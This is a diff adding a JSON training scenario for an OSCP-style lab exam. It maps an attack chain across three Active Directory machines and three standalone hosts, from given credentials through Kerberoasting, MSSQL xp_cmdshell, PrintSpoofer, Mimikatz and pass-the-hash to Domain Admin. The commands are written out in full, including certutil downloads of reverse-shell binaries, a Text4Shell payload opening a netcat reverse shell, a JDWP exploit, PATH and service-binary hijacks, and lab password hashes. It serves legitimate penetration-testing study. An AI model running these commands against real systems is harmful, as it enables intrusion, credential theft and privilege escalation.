@@ -1,0 +1,437 @@
+{
+  "id": "kerberoast-to-domain-admin",
+  "title": "Kerberoast to Domain Admin",
+  "category": "exam-format",
+  "source": ["OSCP B (Challenge Lab 5)"],
+  "designed_by": "lab-derived",
+  "description": "Exam-format scenario: 3 AD machines + 3 standalone. Given creds on AD entry → SeImpersonate → cred dump → Kerberoasting → MSSQL xp_cmdshell → Mimikatz/windows.old → Domain Admin. Standalone: SNMP+PATH hijack (Kiero), Text4Shell+JDWP (Berlin), FreeSWITCH+service hijack (Gust).",
+  "introduction": "Teaches Kerberoasting as a pivot: SPN hashes crack to service accounts that often have xp_cmdshell or high privileges. Essential for when lsassy fails or you need alternate paths.",
+  "mental_model": "Kerberoast early from any domain-joined host. Cracked service accounts (sql_svc, web_svc) often lead to RCE or DA. MSSQL xp_cmdshell + PrintSpoofer is a common DA path.",
+  "key_principles": [
+    "GetUserSPNs with domain creds; crack TGS with hashcat -m 13100",
+    "MSSQL service account + xp_cmdshell = RCE as mssql$ (often SYSTEM)",
+    "windows.old SAM is backup when Mimikatz fails or DA not logged on",
+    "SNMP extend scripts can leak creds; PATH hijack when SUID calls unqualified binary",
+    "JDWP on high port: SSH reverse tunnel to reach it, then exploit"
+  ],
+
+  "indicators": {
+    "difficulty": 6,
+    "cognitive_load": 5,
+    "enumeration_depth": 4,
+    "rabbit_hole_risk": 3,
+    "time_pressure": 5
+  },
+
+  "mitre": {
+    "tactics": ["TA0001","TA0003","TA0004","TA0006","TA0007","TA0008"],
+    "techniques": [
+      {"id":"T1021.006","name":"Windows Remote Management"},
+      {"id":"T1134.001","name":"Token Impersonation/Theft"},
+      {"id":"T1003.001","name":"LSASS Memory"},
+      {"id":"T1003.002","name":"Security Account Manager"},
+      {"id":"T1550.002","name":"Pass the Hash"},
+      {"id":"T1190","name":"Exploit Public-Facing Application"},
+      {"id":"T1572","name":"Protocol Tunneling"},
+      {"id":"T1558.003","name":"Kerberoasting"},
+      {"id":"T1059.001","name":"PowerShell"},
+      {"id":"T1552.001","name":"Credentials In Files"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon","T2-Web-Access","T3-NonWeb-Access","T4a-Linux-PrivEsc","T4b-Win-PrivEsc","T5-Credentials","T6-Pivoting","T7-Lateral"],
+
+  "environment": {
+    "machine_count": 6,
+    "network_count": 2,
+    "os_distribution": {"windows": 4, "linux": 2},
+    "has_ad": true,
+    "has_pivoting": true,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "evil-winrm","printspoofer","godpotato","mimikatz","ligolo-ng",
+    "pass-the-hash","kerberoasting","windows.old","SAM","SYSTEM","SeImpersonate",
+    "xp_cmdshell","impacket-mssqlclient","impacket-GetUserSPNs","text4shell",
+    "jdwp","freeswitch","snmp","nmap","hashcat","impacket-secretsdump",
+    "nxc","lsassy","snmpwalk","CVE-2022-42889","CVE-2022-0847","EDB-46501",
+    "EDB-47799","suid-path-hijack","service-binary-hijack","KiteService"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": true,
+    "pen200_modules": [6,8,12,16,17,18,22],
+    "pattern_frequency": "high",
+    "recommended_order": 4
+  },
+
+  "prerequisites": [],
+  "builds_on": ["credential-relay-chain"],
+
+  "networks": [
+    {"id":"external","cidr":"192.168.x.0/24","label":"Standalone / External"},
+    {"id":"internal","cidr":"10.10.x.0/24","label":"AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id":"ms01",
+      "label":"MS01",
+      "ip":"192.168.x.147",
+      "os":"Windows",
+      "role":"AD Entry (dual-NIC)",
+      "networks":["external","internal"],
+      "services":[
+        {
+          "port":5985,"name":"WinRM","version":"",
+          "vulnerabilities":[
+            {"type":"given-creds","summary":"Evil-WinRM with Eric.Wallows given creds","leads_to":"local-user"}
+          ],
+          "commands":["evil-winrm -i 192.168.x.147 -u Eric.Wallows -p '<given_password>'"]
+        },
+        {
+          "port":22,"name":"SSH","version":"",
+          "vulnerabilities":[
+            {"type":"given-creds","summary":"SSH with Eric.Wallows given creds","leads_to":"local-user"}
+          ],
+          "commands":["ssh Eric.Wallows@192.168.x.147"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"Eric.Wallows",
+          "to":"SYSTEM",
+          "technique":"SeImpersonate → PrintSpoofer",
+          "commands":[
+            "whoami /priv",
+            "PrintSpoofer64.exe -i -c cmd",
+            "PrintSpoofer64.exe -c \"c:\\windows\\temp\\reverse-shell.exe\""
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"web_svc","type":"password","source":"nxc lsassy / Mimikatz / secretsdump → crack NTLM","plaintext":"Diamond1","unlocks":[]},
+        {"user":"sql_svc","type":"password","source":"Kerberoasting (impacket-GetUserSPNs)","plaintext":"Dolphin1","unlocks":["ms02-mssql"]},
+        {"user":"local Admin","type":"ntlm-hash","source":"secretsdump / Mimikatz SAM dump","cracked":"December31, Freedom1, Diamond1","unlocks":[]}
+      ],
+      "alternatives":[
+        {"source":"B1-B4","description":"nxc lsassy, Mimikatz, or secretsdump for credential extraction"},
+        {"source":"B1-B2","description":"NTLM hash cracking with hashcat -m 1000","commands":["hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"]},
+        {"source":"B1-B4","description":"Kerberoasting from MS01 after pivot","commands":["impacket-GetUserSPNs oscp.exam/Eric.Wallows -dc-ip 10.10.x.146 -request -outputfile hashes.kerberoast","hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"]}
+      ]
+    },
+    {
+      "id":"ms02",
+      "label":"MS02",
+      "ip":"10.10.x.148",
+      "os":"Windows",
+      "role":"AD Member",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":1433,"name":"MSSQL","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"MSSQL with sql_svc:Dolphin1 (Kerberoasted)","leads_to":"xp_cmdshell-rce"}
+          ],
+          "commands":[
+            {"cmd": "impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.x.148 -windows-auth", "rationale": "Why: Kerberoasted creds unlock MSSQL for xp_cmdshell RCE"},
+            "EXEC sp_configure 'show advanced options',1; RECONFIGURE;",
+            "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",
+            "EXEC xp_cmdshell 'whoami';",
+            "EXEC xp_cmdshell 'certutil -urlcache -split -f http://<kali-ip>/rev.exe c:\\windows\\temp\\rev.exe';",
+            "EXEC xp_cmdshell 'c:\\windows\\temp\\rev.exe';"
+          ]
+        },
+        {
+          "port":5985,"name":"WinRM","version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"Evil-WinRM with tom_admin or Domain Admin hash","leads_to":"local-user"}
+          ],
+          "commands":["evil-winrm -i 10.10.x.148 -u tom_admin -H '<ntlm_hash>'"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"sql_svc (mssql$)",
+          "to":"SYSTEM",
+          "technique":"SeImpersonate → PrintSpoofer / GodPotato",
+          "commands":[
+            "whoami /priv",
+            "PrintSpoofer64.exe -i -c cmd",
+            "GodPotato-NET4.exe -cmd \"cmd /c c:\\windows\\temp\\reverse-shell.exe\""
+          ]
+        },
+        {
+          "from":"sql_svc",
+          "to":"tom_admin (hash)",
+          "technique":"windows.old SAM/SYSTEM dump → offline hash extraction",
+          "commands":[
+            "dir C:\\windows.old\\Windows\\System32\\config\\",
+            "download C:\\windows.old\\Windows\\System32\\config\\SAM",
+            "download C:\\windows.old\\Windows\\System32\\config\\SYSTEM",
+            {"cmd": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL", "rationale": "Why: Offline SAM dump yields tom_admin hash for DC access"}
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"tom_admin","type":"ntlm-hash","source":"windows.old SAM dump","value":"4979d69d4ca66955c075c41cf45f24dc","unlocks":["dc01"]},
+        {"user":"Administrator (Domain Admin)","type":"ntlm-hash","source":"Mimikatz sekurlsa::logonpasswords on MS02","value":"59b280ba707d22e3ef0aa587fc29ffe5","unlocks":["dc01"]}
+      ],
+      "alternatives":[
+        {"source":"B1-B4","description":"Mimikatz sekurlsa::logonpasswords extracts Domain Admin NTLM directly","commands":["mimikatz.exe","privilege::debug","sekurlsa::logonpasswords"]},
+        {"source":"B1-B2","description":"windows.old SAM/SYSTEM dump for tom_admin hash"},
+        {"source":"B2-B5","description":"GodPotato or SigmaPotato instead of PrintSpoofer for SeImpersonate"}
+      ]
+    },
+    {
+      "id":"dc01",
+      "label":"DC01",
+      "ip":"10.10.x.146",
+      "os":"Windows",
+      "role":"Domain Controller",
+      "networks":["internal"],
+      "services":[
+        {
+          "port":5985,"name":"WinRM","version":"",
+          "vulnerabilities":[
+            {"type":"pth","summary":"Evil-WinRM with tom_admin or Domain Admin hash","leads_to":"domain-admin"}
+          ],
+          "commands":[
+            "evil-winrm -i 10.10.x.146 -u tom_admin -H '4979d69d4ca66955c075c41cf45f24dc'",
+            "evil-winrm -i 10.10.x.146 -u Administrator -H '59b280ba707d22e3ef0aa587fc29ffe5'"
+          ]
+        }
+      ],
+      "privesc":[],
+      "credentials":[],
+      "alternatives":[
+        {"source":"B1-B3","description":"PtH as Administrator using DA hash from Mimikatz on MS02 (bypasses tom_admin path)"}
+      ]
+    },
+    {
+      "id":"kiero",
+      "label":"Kiero",
+      "ip":"192.168.x.149",
+      "os":"Linux",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":161,"name":"SNMP","version":"UDP",
+          "vulnerabilities":[
+            {"type":"info-disclosure","summary":"snmpwalk reveals 'Resetting password of kiero to default value'","leads_to":"ftp-creds"}
+          ],
+          "commands":[
+            "nmap -sU -p 161 192.168.x.149",
+            "snmpwalk -v2c -c public 192.168.x.149",
+            "snmpwalk -v2c -c public 192.168.x.149 NET-SNMP-EXTEND-MIB::nsExtendObjects"
+          ]
+        },
+        {
+          "port":21,"name":"FTP","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"FTP with kiero:kiero (from SNMP disclosure)","leads_to":"ssh-key"}
+          ],
+          "commands":["ftp 192.168.x.149","# Login: kiero / kiero","# Download id_rsa for user john"]
+        },
+        {
+          "port":22,"name":"SSH","version":"",
+          "vulnerabilities":[
+            {"type":"auth","summary":"SSH with john's id_rsa from FTP","leads_to":"local-user"}
+          ],
+          "commands":["ssh -i id_rsa john@192.168.x.149"]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"john",
+          "to":"root",
+          "technique":"SUID binary PATH hijack — RESET_PASSWD calls chpasswd without absolute path",
+          "commands":[
+            "find / -perm -4000 -type f 2>/dev/null",
+            "strings /home/john/RESET_PASSWD",
+            "echo '#!/bin/bash' > /tmp/chpasswd",
+            "echo '/bin/bash -p' >> /tmp/chpasswd",
+            "chmod +x /tmp/chpasswd",
+            "export PATH=/tmp:$PATH",
+            "./RESET_PASSWD"
+          ]
+        }
+      ],
+      "credentials":[
+        {"user":"kiero","type":"password","source":"SNMP disclosure (default = username)","plaintext":"kiero","unlocks":["kiero-ftp"]},
+        {"user":"john","type":"ssh-key","source":"FTP id_rsa (no passphrase)","unlocks":["kiero-ssh"]}
+      ],
+      "alternatives":[
+        {"source":"B2","description":"DirtyPipe (CVE-2022-0847) as alternative privesc","commands":["searchsploit dirty pipe","# Use CVE-2022-0847 exploit for root"]}
+      ]
+    },
+    {
+      "id":"berlin",
+      "label":"Berlin",
+      "ip":"192.168.x.150",
+      "os":"Linux",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":8080,"name":"HTTP (Spring Boot)","version":"",
+          "vulnerabilities":[
+            {"type":"rce","cve":"CVE-2022-42889","summary":"Text4Shell — Apache Commons Text 1.8 in /search","leads_to":"local-user"}
+          ],
+          "commands":[
+            "gobuster dir -u http://192.168.x.150:8080 -w /usr/share/wordlists/dirb/common.txt",
+            "# /CHANGELOG reveals Apache Commons Text 1.8",
+            "curl \"http://192.168.x.150:8080/search?query=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('${script:javascript:java.lang.Runtime.getRuntime().exec(\\\"busybox nc <kali-ip> <port> -e /bin/bash\\\")}')\")\""
+          ]
+        },
+        {
+          "port":8000,"name":"JDWP","version":"internal",
+          "vulnerabilities":[
+            {"type":"rce","cve":"EDB-46501","summary":"JDWP remote debugging — root runs java -Xrunjdwp:address=8000","leads_to":"root"}
+          ],
+          "commands":[
+            "ss -ntlpu",
+            "# linpeas: root running java -Xdebug -Xrunjdwp:address=8000",
+            "ssh -R 8000:localhost:8000 dev@192.168.x.150",
+            "searchsploit -m 46501",
+            "python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc <kali-ip> <port> -e /bin/bash'",
+            "nc 192.168.x.150 5000"
+          ]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"dev",
+          "to":"root",
+          "technique":"JDWP remote debugging RCE — tunnel port 8000, trigger via nc to 5000",
+          "commands":[
+            "ssh -f -N -R 8000:localhost:8000 kali@<kali-ip>",
+            "python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc <kali-ip> <port> -e /bin/bash'",
+            "nc 192.168.x.150 5000"
+          ]
+        }
+      ],
+      "credentials":[],
+      "alternatives":[
+        {"source":"B1","description":"Ligolo-ng to tunnel JDWP port 8000 instead of SSH reverse tunnel"},
+        {"source":"B2","description":"SSH reverse tunnel for JDWP: ssh -R 8000:localhost:8000"}
+      ]
+    },
+    {
+      "id":"gust",
+      "label":"Gust",
+      "ip":"192.168.x.151",
+      "os":"Windows",
+      "role":"Standalone",
+      "networks":["external"],
+      "services":[
+        {
+          "port":8021,"name":"FreeSWITCH Event Socket","version":"",
+          "vulnerabilities":[
+            {"type":"rce","cve":"EDB-47799","summary":"FreeSWITCH default creds (ClueCon) → command execution","leads_to":"local-user"}
+          ],
+          "commands":[
+            "nmap -p 80,3389,8021 192.168.x.151",
+            "searchsploit -m 47799",
+            "python3 47799.py 192.168.x.151 'powershell -e <base64-reverse-shell>'"
+          ]
+        },
+        {
+          "port":80,"name":"HTTP (IIS)","version":"",
+          "vulnerabilities":[],
+          "commands":[]
+        },
+        {
+          "port":3389,"name":"RDP","version":"",
+          "vulnerabilities":[],
+          "commands":[]
+        }
+      ],
+      "privesc":[
+        {
+          "from":"chris",
+          "to":"SYSTEM",
+          "technique":"Service binary hijack — KiteService.exe writable, replace with reverse shell",
+          "commands":[
+            "icacls \"c:\\path\\to\\KiteService.exe\"",
+            "copy KiteService.exe KiteService.exe.bak",
+            "certutil -urlcache -split -f http://<kali-ip>/evil-service.exe c:\\path\\KiteService.exe",
+            "sc stop KiteService",
+            "sc start KiteService"
+          ]
+        }
+      ],
+      "credentials":[],
+      "alternatives":[
+        {"source":"B2,B3,B5","description":"GodPotato / SigmaPotato for SeImpersonate instead of service hijack","commands":["GodPotato-NET4.exe -cmd \"cmd /c c:\\windows\\temp\\reverse-shell.exe\""]}
+      ]
+    }
+  ],
+
+  "connections":[
+    {
+      "from":"ms01","to":"ms02",
+      "technique":"Kerberoasting → MSSQL (impacket-mssqlclient)",
+      "requires":"sql_svc:Dolphin1 from Kerberoasting on MS01",
+      "pivot":"Ligolo-ng tunnel through MS01 to 10.10.x.0/24",
+      "path_ids":["path-ad-kerberoast","path-ad-main"],
+      "commands":[
+        "ligolo-ng agent -connect <kali-ip>:11601 -retry -ignore-cert",
+        "session","ifconfig","start --tun ligolo",
+        "ip route add 10.10.x.0/24 dev ligolo",
+        {"cmd": "impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.x.148 -windows-auth", "rationale": "Why: Pivot to MSSQL via Kerberoasted sql_svc for xp_cmdshell"}
+      ]
+    },
+    {
+      "from":"ms02","to":"dc01",
+      "technique":"Pass-the-Hash (Evil-WinRM)",
+      "requires":"tom_admin hash from windows.old SAM dump OR Domain Admin hash from Mimikatz",
+      "pivot":"Already on internal network via MS01 Ligolo tunnel",
+      "path_ids":["path-ad-main","path-ad-kerberoast"],
+      "commands":[
+        "evil-winrm -i 10.10.x.146 -u tom_admin -H '4979d69d4ca66955c075c41cf45f24dc'",
+        "evil-winrm -i 10.10.x.146 -u Administrator -H '59b280ba707d22e3ef0aa587fc29ffe5'"
+      ]
+    }
+  ],
+
+  "attack_paths":[
+    {
+      "id":"path-ad-main",
+      "name":"AD: Kerberoast → MSSQL → DA (Primary)",
+      "color":"#6bb8cc",
+      "steps":["ms01","ms02","dc01"],
+      "description":"Given creds → PrintSpoofer → cred dump → Kerberoast → MSSQL xp_cmdshell → PrintSpoofer/GodPotato → Mimikatz → DA hash → DC01"
+    },
+    {
+      "id":"path-ad-kerberoast",
+      "name":"AD: Kerberoast → windows.old Alternative",
+      "color":"#e8a87c",
+      "steps":["ms01","ms02","dc01"],
+      "description":"Same as primary but tom_admin from windows.old SAM instead of Mimikatz DA hash"
+    },
+    {
+      "id":"path-kiero",
+      "name":"Standalone: Kiero (SNMP → PATH Hijack)",
+      "color":"#85e89d",
+      "steps":["kiero"],
+      "description":"UDP 161 SNMP → kiero:kiero → FTP → john id_rsa → SSH → SUID PATH hijack (RESET_PASSWD) → root"
+    },
+    {
+      "id":"path-berlin",
+      "name":"Standalone: Berlin (Text4Shell → JDWP)",
+      "color":"#d2a8ff",
+      "steps":["berlin"],
+      "description":"Text4Shell CVE-2022-42889 → dev shell → tunnel JDWP 8000 → jdwp-shellifier → nc trigger 5000 → root"
+    },
+    {
+      "id":"path-gust",
+      "name":"Standalone: Gust (FreeSWITCH → Service Hijack)",
+      "color":"#f0e68c",
+      "steps":["gust"],
+      "description":"FreeSWITCH EDB-47799 → chris → KiteService.exe hijack OR GodPotato → SYSTEM"
+    }
+  ]
+}
